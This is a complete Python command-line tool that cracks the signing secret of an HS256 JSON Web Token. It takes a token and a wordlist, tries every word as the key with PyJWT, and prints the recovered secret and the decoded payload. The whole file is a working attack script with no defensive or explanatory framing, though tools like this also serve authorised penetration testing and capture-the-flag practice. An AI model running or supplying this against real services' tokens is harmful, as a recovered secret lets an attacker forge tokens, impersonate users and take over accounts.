import jwt
import sys
from tqdm import tqdm

def load_wordlist(path):
    with open(path, 'r', encoding='latin-1') as f:
        return [line.strip() for line in f.readlines()]

def jwt_bruteforce(token, wordlist_path, algorithm='HS256'):
    wordlist = load_wordlist(wordlist_path)
    header = jwt.get_unverified_header(token)

    print(f"[i] JWT Algorithm: {header.get('alg', algorithm)}")
    print(f"[i] Total passwords to try: {len(wordlist)}")

    for secret in tqdm(wordlist, desc="Bruteforcing"):
        try:
            payload = jwt.decode(token, secret, algorithms=[algorithm])
            print("\n[+] Secret key found:", secret)
            print("[+] Decoded payload:", payload)
            return secret
        except jwt.InvalidSignatureError:
            continue
        except jwt.DecodeError:
            continue
        except Exception as e:
            print("\n[!] Unexpected error:", e)
            break

    print("\n[-] Secret key not found.")
    return None

if __name__ == '__main__':
    if len(sys.argv) != 3:
        print(f"Usage: python {sys.argv[0]} <jwt_token> <path_to_wordlist.txt>")
        sys.exit(1)

    jwt_token = sys.argv[1]
    wordlist_path = sys.argv[2]
    jwt_bruteforce(jwt_token, wordlist_path)